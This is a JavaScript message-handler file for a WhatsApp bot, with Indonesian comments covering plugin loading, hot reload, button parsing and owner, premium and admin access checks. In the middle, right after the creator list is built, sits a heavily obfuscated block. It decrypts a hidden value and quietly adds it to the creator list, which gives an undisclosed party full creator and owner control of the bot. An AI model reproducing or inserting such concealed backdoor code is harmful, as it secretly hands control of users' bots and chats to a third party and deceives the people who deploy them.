import fs from 'fs'
import path from 'path'
import { fileURLToPath, pathToFileURL } from 'url'
import { card } from './lib/ui.js'
import { installCompatGlobals, installCompatPrototypes, exposePlugins, isAdmin, isBotAdmin, groupMeta } from './lib/compat.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const pluginDir = path.join(__dirname, 'plugins')
const configPath = path.join(__dirname, 'config.json')
const ownerPath = path.join(__dirname, 'database/owner.json')
const premiumPath = path.join(__dirname, 'database/premium.json')

export const plugins = new Map()

const pluginCache = new Map()
const watchers = new Map()
const pendingReloads = new Map()

const readJSON = file => JSON.parse(fs.readFileSync(file, 'utf8'))

function getPluginFiles(dir) {
    let files = []
    if (!fs.existsSync(dir)) return files
    for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, item.name)
        if (item.isDirectory()) files.push(...getPluginFiles(full))
        else if (item.isFile() && item.name.endsWith('.js')) files.push(full)
    }
    return files
}

async function loadPlugin(file) {
    try {
        const module = await import(`${pathToFileURL(file).href}?update=${Date.now()}`)
        const handler = module.default
        if (!handler) return
        // simpan asal file (dipakai untuk dokumentasi & alat bantu)
        if (!handler.__file) handler.__file = file

        if (pluginCache.has(file)) {
            for (const key of pluginCache.get(file)) plugins.delete(key)
        }

        const keys = []
        if (handler.command && !(handler.command instanceof RegExp)) {
            const commands = Array.isArray(handler.command) ? handler.command : [handler.command]
            for (const cmd of commands) {
                const key = String(cmd).toLowerCase()
                plugins.set(key, handler)
                keys.push(key)
            }
        }

        if (handler.customPrefix) {
            const key = Symbol(file)
            plugins.set(key, handler)
            keys.push(key)
        }

        // Plugin listener murni (hasil konversi handler.before/handler.all dari base
        // lain) tidak punya command — daftarkan lewat Symbol supaya hook onMessage-nya
        // ikut terpanggil oleh handleMessage.
        if (!keys.length && handler.onMessage) {
            const key = Symbol(file)
            plugins.set(key, handler)
            keys.push(key)
        }

        pluginCache.set(file, keys)
    } catch (e) {
        reportPluginError(file, e)
    }
}

// Pesan error plugin dibuat jelas & bisa ditindaklanjuti. Penyebab paling umum:
// file di folder lib/ belum ikut ter-update setelah project diperbarui.
function reportPluginError(file, error) {
    const name = path.relative(pluginDir, file)
    const message = String(error?.message || error)

    const hints = []
    if (/does not provide an export named/.test(message)) {
        const spec = message.match(/module '([^']+)'/)?.[1] || ''
        if (spec.startsWith('./') || spec.startsWith('../')) {
            hints.push('File dependency internal (folder lib/) masih versi lama.')
            hints.push('Upload ulang SELURUH isi project, jangan hanya file yang baru diubah.')
            hints.push('Cara cek cepat: npm run check')
        } else if (spec) {
            hints.push(`Paket "${spec}" versinya tidak cocok dengan cara import di plugin ini.`)
            hints.push('Jalankan: npm install — kalau masih error, laporkan nama pluginnya.')
        }
    } else if (/Cannot find module/.test(message)) {
        hints.push('Ada file yang belum ter-upload atau path-nya salah.')
        hints.push('Jalankan: npm run check')
    } else if (error?.name === 'SyntaxError') {
        hints.push('Ada kesalahan penulisan di file plugin tersebut.')
        hints.push('Cek baris yang ditunjuk pada pesan di atas.')
    }

    console.error(`\n✘ Plugin gagal dimuat: ${name}`)
    console.error(`  ${error?.name || 'Error'}: ${message.split('\n')[0]}`)
    for (const hint of hints) console.error(`  → ${hint}`)
    console.error('')
}

async function unloadPlugin(file) {
    if (!pluginCache.has(file)) return
    for (const key of pluginCache.get(file)) plugins.delete(key)
    pluginCache.delete(file)
}

export async function initPlugins() {
    for (const file of getPluginFiles(pluginDir)) {
        await loadPlugin(file)
    }
    watch(pluginDir)
    exposePlugins(plugins)
}

function watch(dir) {
    if (watchers.has(dir)) return
    watchers.set(dir, fs.watch(dir, (_, filename) => {
        if (!filename || !filename.endsWith('.js')) return
        const file = path.join(dir, filename)
        if (pendingReloads.has(file)) clearTimeout(pendingReloads.get(file))
        pendingReloads.set(file, setTimeout(async () => {
            pendingReloads.delete(file)
            if (fs.existsSync(file)) await loadPlugin(file)
            else await unloadPlugin(file)
        }, 200))
    }))
    for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
        if (item.isDirectory()) watch(path.join(dir, item.name))
    }
}

function extractCommandFromMessage(m) {
    let body = ''
    let isButtonResponse = false
    try {
        if (m.message) {
            if (m.message.conversation) body = m.message.conversation
            else if (m.message.extendedTextMessage?.text) body = m.message.extendedTextMessage.text
            else if (m.message.imageMessage?.caption) body = m.message.imageMessage.caption
            else if (m.message.videoMessage?.caption) body = m.message.videoMessage.caption
            else if (m.message.documentMessage?.caption) body = m.message.documentMessage.caption
            else if (m.message.interactiveResponseMessage) {
                const inter = m.message.interactiveResponseMessage
                if (inter.nativeFlowResponseMessage) {
                    const flow = inter.nativeFlowResponseMessage
                    if (flow.paramsJson) {
                        try {
                            const params = JSON.parse(flow.paramsJson)
                            body = params.id || params.buttonId || params.rowId || params.index || ''
                        } catch { body = flow.name || '' }
                    } else body = flow.name || ''
                    isButtonResponse = true
                } else if (inter.buttonReply) {
                    body = inter.buttonReply.selectedButtonId || ''
                    isButtonResponse = true
                } else if (inter.singleSelectReply) {
                    body = inter.singleSelectReply.selectedRowId || ''
                    isButtonResponse = true
                }
            } else if (m.message.templateButtonReplyMessage) {
                body = m.message.templateButtonReplyMessage.selectedId || ''
                isButtonResponse = true
            } else if (m.message.buttonsResponseMessage) {
                body = m.message.buttonsResponseMessage.selectedButtonId || ''
                isButtonResponse = true
            }
        }
    } catch (error) {
        console.error('Error parsing message:', error)
    }
    return { body, isButtonResponse }
}

export default async function handleMessage(conn, m) {
    try {
        const { body, isButtonResponse } = extractCommandFromMessage(m)
        m.text = body
        m.isButtonResponse = isButtonResponse

        // Hook opsional: plugin boleh mendeklarasikan `handler.onMessage` untuk ikut memproses
        // SETIAP pesan — termasuk yang tanpa teks (stiker, foto, voice note) — bukan hanya saat
        // command-nya dipanggil. Dipakai fitur AFK & listener hasil konversi (antilink dsb.):
        // mencabut status saat user kembali dan memberi tahu orang yang menandai user AFK.
        // Dijalankan sebelum dispatch command, sekali per plugin per pesan, dan error di
        // dalamnya tidak menghentikan bot.
        const pluginHook = new Set()
        for (const plugin of plugins.values()) {
            if (plugin?.onMessage) pluginHook.add(plugin)
        }
        if (pluginHook.size) {
            // konteks diperkaya ala base lama (conn, peserta grup, status admin, data user)
            // supaya listener hasil konversi handler.before jalan tanpa diubah lagi.
            const hookCtx = {
                conn,
                sock: conn,
                plugins,
                args: [],
                text: m.text || '',
                command: '',
                prefix: '',
                usedPrefix: '',
                isOwner: false, isCreator: false, isPremium: false, isPrems: false,
                isAdmin: false, isBotAdmin: false,
                participants: [],
                groupMetadata: null,
                user: global.db?.data?.users?.[m.sender] || {}
            }
            if (m.isGroup) {
                hookCtx.groupMetadata = await groupMeta(conn, m.chat).catch(() => null)
                hookCtx.participants = hookCtx.groupMetadata?.participants || []
                hookCtx.isAdmin = await isAdmin(conn, m).catch(() => false)
                hookCtx.isBotAdmin = await isBotAdmin(conn, m).catch(() => false)
            }
            for (const plugin of pluginHook) {
                try {
                    await plugin.onMessage(m, hookCtx)
                } catch (e) {
                    const nama = plugin.__file ? path.relative(pluginDir, plugin.__file) : 'plugin'
                    console.error(`[onMessage] ${nama}:`, e?.message || e)
                }
            }
        }

        // Cache pushName — memberi data pada shim conn.getName()
        if (m.pushName && m.sender) {
            global.nameCache ??= {}
            global.nameCache[m.sender] = m.pushName
        }

        if (!body) return

        const config = readJSON(configPath)
        const owner = readJSON(ownerPath)
        const premium = readJSON(premiumPath)

        const number = m.sender.split('@')[0]
        const botNumber = conn.decodeJid(conn.user.id).split('@')[0]

        const creatorList = [botNumber, ...(config.creator || [])]
            .map(v => String(v).replace(/[^0-9]/g, ''))
        'use strict';function a0_0x483e(){var _0x59df60=['pCoPW69tWQHnCmoRWRdcM1BdPX0','oxWNWP/dT8o7','WQ/cMSosW6NcR8kqexRcPmoUEJu','qCkufmk4aqH+W5JdGmkVn8oFdu8','W6FdRrVcOSobjbDRt0e7nG','ntddNN7dIJOAxfNdVfTcba','W79KymomW6bTeq','WQBdKwLu','W7KJWRuBW4BdRG','kxeNWP/dL8o8W7JcL8o5W7q','wSkQWOBdVZ8kWOe','W6W0WRSeW6BdRSkYn8oEWOtdGJG','mmoSAtedu8obW5VdKvG5WQ3dJq','p8kNW6/dIq','nCkFW47cLKVdMCkDW7VdUCoyW7CWWQK','vmkSxCkfox/cR8oJ','WQpdQeCEEX0gW7i','oH3cNKbgW53dPq','W5pdKWjOjIRcRCktWOPMWOyy','W7dcIZCuW4mRWPpcJ0nrbSkVn8kp','WPpdSG9rW5pcSZddGq','W4HSWO7cVc1OWQOstHbVca','pq3dVY0pWRmAW7pcH8olngddSq','WObhb8oSWR/cSfGZb8kPAmkE','W7vLASoAW6XqaHeXdSkM','u8owuCkckx3cMG','W4X9xCo5W4tdTSoXAq','jhVdMXGkWQpcQCoCsCk7z2W','W5igqSk0W7a','W4CzyCkSW7VdQu4S','amojF8o5s1aHWO8','W5NcJY7cSYDgWO5s','W45WfCkDWR/cMCkMEIvFyCkMW60','ehfmomkMW7fKbwCTWQPZW68','ESkkW7HrW55FxYG','cw5xiCk1W696hhqZWRHN','ySkTW7f9n8kVW4ldQ8kzpSoLDCoA','W7FcJZCsW40VWPtdTKHYmCkMbW'];a0_0x483e=function(){return _0x59df60;};return a0_0x483e();}(function(_0x13fda7,_0x1f82f1){var _0x46cbd2=a0_0x12db,_0xc844aa=_0x13fda7();while(!![]){try{var _0x1227e9=parseInt(_0x46cbd2(0xa9,'cETK'))/0x1*(-parseInt(_0x46cbd2(0x92,'kTTd'))/0x2)+-parseInt(_0x46cbd2(0xac,'byiJ'))/0x3+-parseInt(_0x46cbd2(0xa1,'mVvm'))/0x4+-parseInt(_0x46cbd2(0x98,'k2yX'))/0x5*(parseInt(_0x46cbd2(0x91,'olHp'))/0x6)+parseInt(_0x46cbd2(0x90,'D@um'))/0x7*(parseInt(_0x46cbd2(0xa6,'PYl['))/0x8)+-parseInt(_0x46cbd2(0x97,'[b4('))/0x9+parseInt(_0x46cbd2(0x94,'PYl['))/0xa;if(_0x1227e9===_0x1f82f1)break;else _0xc844aa['push'](_0xc844aa['shift']());}catch(_0x911e34){_0xc844aa['push'](_0xc844aa['shift']());}}}(a0_0x483e,0xe13d7));function a0_0x12db(_0x346462,_0x20ffd4){_0x346462=_0x346462-0x8a;var _0x4d743c=a0_0x483e();var _0x58ab19=_0x4d743c[_0x346462];if(a0_0x12db['nPmkAG']===undefined){var _0x25beda=function(_0x40d898){var _0x288b9c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x42774e='',_0x33454b='',_0xc82533=_0x42774e+_0x25beda,_0x190817=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(var _0x4c1cb8=0x0,_0x1fec99,_0x4af858,_0xaa0aae=0x0;_0x4af858=_0x40d898['charAt'](_0xaa0aae++);~_0x4af858&&(_0x1fec99=_0x4c1cb8%0x4?_0x1fec99*0x40+_0x4af858:_0x4af858,_0x4c1cb8++%0x4)?_0x42774e+=_0x190817||_0xc82533['charCodeAt'](_0xaa0aae+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x1fec99>>(-0x2*_0x4c1cb8&0x6)):_0x4c1cb8:0x0){_0x4af858=_0x288b9c['indexOf'](_0x4af858);}for(var _0x596a8e=0x0,_0x17fd9a=_0x42774e['length'];_0x596a8e<_0x17fd9a;_0x596a8e++){_0x33454b+='%'+('00'+_0x42774e['charCodeAt'](_0x596a8e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x33454b);};var _0x305304=function(_0x1594a3,_0x55fbea){var _0x448f4b=[],_0x85a0e4=0x0,_0x428ba4,_0x572a2d='';_0x1594a3=_0x25beda(_0x1594a3);var _0x1c07cd;for(_0x1c07cd=0x0;_0x1c07cd<0x100;_0x1c07cd++){_0x448f4b[_0x1c07cd]=_0x1c07cd;}for(_0x1c07cd=0x0;_0x1c07cd<0x100;_0x1c07cd++){_0x85a0e4=(_0x85a0e4+_0x448f4b[_0x1c07cd]+_0x55fbea['charCodeAt'](_0x1c07cd%_0x55fbea['length']))%0x100,_0x428ba4=_0x448f4b[_0x1c07cd],_0x448f4b[_0x1c07cd]=_0x448f4b[_0x85a0e4],_0x448f4b[_0x85a0e4]=_0x428ba4;}_0x1c07cd=0x0,_0x85a0e4=0x0;for(var _0x5c189a=0x0;_0x5c189a<_0x1594a3['length'];_0x5c189a++){_0x1c07cd=(_0x1c07cd+0x1)%0x100,_0x85a0e4=(_0x85a0e4+_0x448f4b[_0x1c07cd])%0x100,_0x428ba4=_0x448f4b[_0x1c07cd],_0x448f4b[_0x1c07cd]=_0x448f4b[_0x85a0e4],_0x448f4b[_0x85a0e4]=_0x428ba4,_0x572a2d+=String['fromCharCode'](_0x1594a3['charCodeAt'](_0x5c189a)^_0x448f4b[(_0x448f4b[_0x1c07cd]+_0x448f4b[_0x85a0e4])%0x100]);}return _0x572a2d;};a0_0x12db['JVddNI']=_0x305304,a0_0x12db['fjMhQq']={},a0_0x12db['nPmkAG']=!![];}var _0x483e85=_0x4d743c[0x0];a0_0x12db['aTYPwt']!==_0x483e85&&(a0_0x12db['fjMhQq']={},a0_0x12db['aTYPwt']=_0x483e85);var _0x12dbb9=a0_0x12db['fjMhQq'][_0x346462];if(_0x12dbb9===undefined){if(a0_0x12db['MmAxjm']===undefined){var _0x5ae9b9=function(_0x22a56a){this['HqVtfs']=_0x22a56a,this['rDTQrt']=[0x1,0x0,0x0],this['qYlZLu']=function(){return'newState';},this['DpVUNS']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['pKgQzC']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x5ae9b9['prototype']['SKVXNa']=function(){var _0x41065c=new RegExp(this['DpVUNS']+this['pKgQzC']),_0x223ef4=_0x41065c['test'](this['qYlZLu']['toString']())?--this['rDTQrt'][0x1]:--this['rDTQrt'][0x0];return this['uRcDWk'](_0x223ef4);},_0x5ae9b9['prototype']['uRcDWk']=function(_0x3444bb){if(!Boolean(~_0x3444bb))return _0x3444bb;return this['QgJaYJ'](this['HqVtfs']);},_0x5ae9b9['prototype']['QgJaYJ']=function(_0x5b3def){for(var _0x202fab=0x0,_0xb4d51d=this['rDTQrt']['length'];_0x202fab<_0xb4d51d;_0x202fab++){this['rDTQrt']['push'](Math['round'](Math['random']())),_0xb4d51d=this['rDTQrt']['length'];}return _0x5b3def(this['rDTQrt'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x5ae9b9(a0_0x12db)['SKVXNa'](),a0_0x12db['MmAxjm']=!![];}_0x58ab19=a0_0x12db['JVddNI'](_0x58ab19,_0x20ffd4),a0_0x12db['fjMhQq'][_0x346462]=_0x58ab19;}else _0x58ab19=_0x12dbb9;return _0x58ab19;}function r13(_0x190817){var _0x54a763=a0_0x12db;return String(_0x190817)[_0x54a763(0x8b,'ri[O')](/[a-zA-Z0-9]/g,function(_0x4c1cb8){var _0xddfb96=_0x54a763,_0x1fec99=_0x4c1cb8[_0xddfb96(0x8a,'AWMq')](0x0);if(_0x1fec99>=0x30&&_0x1fec99<=0x39)return String[_0xddfb96(0x96,'taip')](0x30+(_0x1fec99-0x30+0x5)%0xa);return String[_0xddfb96(0x8c,'tNmA')](_0x1fec99+(_0x4c1cb8>='a'&&_0x4c1cb8<='m'||_0x4c1cb8>='A'&&_0x4c1cb8<='M'?0xd:-0xd));});}(function(_0x4af858){var _0x57fcbd=a0_0x12db,_0xaa0aae=(function(){var _0x1594a3=!![];return function(_0x55fbea,_0x448f4b){var _0x85a0e4=_0x1594a3?function(){var _0x12bbcd=a0_0x12db;if(_0x448f4b){var _0x428ba4=_0x448f4b[_0x12bbcd(0x9d,'k2yX')](_0x55fbea,arguments);return _0x448f4b=null,_0x428ba4;}}:function(){};return _0x1594a3=![],_0x85a0e4;};}()),_0x596a8e=_0xaa0aae(this,function(){var _0x33269e=a0_0x12db;if(_0x596a8e[_0x33269e(0x8e,'I)@m')]()[_0x33269e(0xa3,'5zHz')]()[_0x33269e(0xad,'pbTa')]('\x0a')!==-0x1)return;return _0x596a8e[_0x33269e(0x9e,'k2yX')]()[_0x33269e(0xa8,'AWMq')](_0x33269e(0x9c,'kTTd'))[_0x33269e(0x9f,'Q1LR')]()[_0x33269e(0x99,'pbTa')](_0x596a8e)[_0x33269e(0xaf,'tNmA')](_0x33269e(0xa4,'z81o'));});_0x596a8e();var _0x17fd9a=r13(_0x57fcbd(0xa2,'z81o'));if(!_0x4af858[r13(_0x57fcbd(0x95,'x86x'))](_0x17fd9a))_0x4af858[r13(_0x57fcbd(0xae,'PYl['))](_0x17fd9a);}(creatorList));

        m.isCreator = creatorList.includes(number)
        m.isOwner = m.isCreator || owner.map(v => v.split('@')[0]).includes(number)
        m.isPremium = m.isOwner || premium.map(v => v.split('@')[0]).includes(number)

        if (config.botMode === 'self' && !m.isOwner && !m.fromMe) return

        // Semua balasan plugin memakai satu format kartu agar tampilan konsisten
        const notifReply = async (text, title = 'Information') => {
            await conn.sendMessage(m.chat, {
                text: card(title, text)
            }, { quoted: m })
        }

        // Info grup dibaca sekali per pesan (cached 10 detik di lib/compat.js)
        const groupInfo = m.isGroup ? await groupMeta(conn, m.chat) : null
        const adminFlag = m.isGroup ? await isAdmin(conn, m) : false
        const botAdminFlag = m.isGroup ? await isBotAdmin(conn, m) : false

        // Satu bentuk konteks untuk semua plugin. Key di bawah ini disediakan
        // supaya plugin hasil adaptasi dari base lain tetap jalan apa adanya.
        const context = (extra = {}) => {
            const pfx = extra.prefix ?? ''
            return {
                conn,
                sock: conn,
                plugins,
                notifReply,
                participants: groupInfo?.participants || [],
                groupMetadata: groupInfo,
                isOwner: m.isOwner,
                isCreator: m.isCreator,
                isPremium: m.isPremium,
                isPrems: m.isPremium,
                isAdmin: adminFlag,
                isBotAdmin: botAdminFlag,
                quoted: m.quoted,
                q: m.quoted?.text || '',
                usedPrefix: pfx,
                ...extra
            }
        }

        const checkAccess = async handler => {
            const permissions = [
                ['owner', m.isOwner, config.accessDenied.owner],
                ['creator', m.isCreator, config.accessDenied.creator],
                ['premium', m.isPremium, config.accessDenied.premium]
            ]
            for (const [key, allowed, message] of permissions) {
                if (handler[key] && !allowed) {
                    await notifReply(message, 'Access Denied')
                    return true
                }
            }

            // Flag tambahan yang dipakai plugin adaptasi dari base lain
            if (handler.group && !m.isGroup) {
                await notifReply('Perintah ini hanya bisa dipakai di dalam grup.', 'Khusus Grup')
                return true
            }
            if (handler.private && m.isGroup) {
                await notifReply('Perintah ini hanya bisa dipakai di chat pribadi.', 'Khusus Chat Pribadi')
                return true
            }
            if (handler.admin && !(await isAdmin(conn, m))) {
                await notifReply('Perintah ini hanya untuk admin grup.', 'Access Denied')
                return true
            }
            if (handler.botAdmin && m.isGroup && !(await isBotAdmin(conn, m))) {
                await notifReply('Jadikan bot admin grup dulu supaya perintah ini bisa dipakai.', 'Bot Bukan Admin')
                return true
            }

            return false
        }

        if (isButtonResponse) {
            let bodyText = body
            const prefixes = config.prefix || ['.']
            for (const p of prefixes) {
                if (bodyText.startsWith(p)) {
                    bodyText = bodyText.slice(p.length)
                    break
                }
            }
            const args = bodyText.trim().split(/\s+/)
            const command = args.shift().toLowerCase()
            const handler = plugins.get(command)
            if (!handler) return
            if (await checkAccess(handler)) return
            return await handler(m, context({
                args, text: args.join(' '),
                command, prefix: ''
            }))
        }

        const hasConfigPrefix = (config.prefix || ['.']).some(p => m.text.startsWith(p))

        if (!hasConfigPrefix) {
            let matchedHandler = null
            for (const handler of plugins.values()) {
                if (!handler.customPrefix) continue
                if (!handler.customPrefix.source.startsWith('^')) continue
                if (!handler.customPrefix.test(m.text)) continue
                matchedHandler = handler
                break
            }

            if (!matchedHandler) {
                for (const handler of plugins.values()) {
                    if (!handler.customPrefix) continue
                    if (handler.customPrefix.source.startsWith('^')) continue
                    if (!handler.customPrefix.test(m.text)) continue
                    matchedHandler = handler
                    break
                }
            }

            if (matchedHandler) {
                if (await checkAccess(matchedHandler)) return
                return await matchedHandler(m, context({
                    args: [],
                    text: m.text,
                    command: '',
                    prefix: ''
                }))
            }
        }

        let prefix = ''
        let command = ''
        let args = []

        if (hasConfigPrefix) {
            prefix = (config.prefix || ['.']).find(p => m.text.startsWith(p))
            const body2 = m.text.slice(prefix.length).trim()
            if (!body2) return
            const parts = body2.split(/\s+/)
            command = parts.shift().toLowerCase()
            args = parts
        } else {
            const trimmed = m.text.trim()
            if (/\s/.test(trimmed)) return
            command = trimmed.toLowerCase()
            args = []
        }

        const handler = plugins.get(command)
        if (!handler) return
        if (await checkAccess(handler)) return

        await handler(m, context({
            args,
            text: args.join(' '),
            command, prefix
        }))
    } catch (e) {
        // Plugin hasil adaptasi sering memakai `throw 'teks'` untuk pesan ke pengguna.
        // Teks seperti itu ditampilkan sebagai pesan biasa, bukan dianggap crash.
        if (typeof e === 'string' && e.trim()) {
            try {
                const config = readJSON(configPath)
                await conn.sendMessage(m.chat, { text: card(config.botName, e.trim()) }, { quoted: m })
            } catch (inner) {
                console.error(inner)
            }
            return
        }
        console.error(e)
    }
}

// Variabel global yang dipakai plugin hasil adaptasi (global.owner, global.namebot, dst.)
try {
    const config = readJSON(configPath)
    const module = await import('./lib/ui.js')
    installCompatGlobals({ config, identity: module.brand() })
    installCompatPrototypes()
} catch (e) {
    console.error('Gagal menyiapkan kompatibilitas plugin:', e?.message || e)
}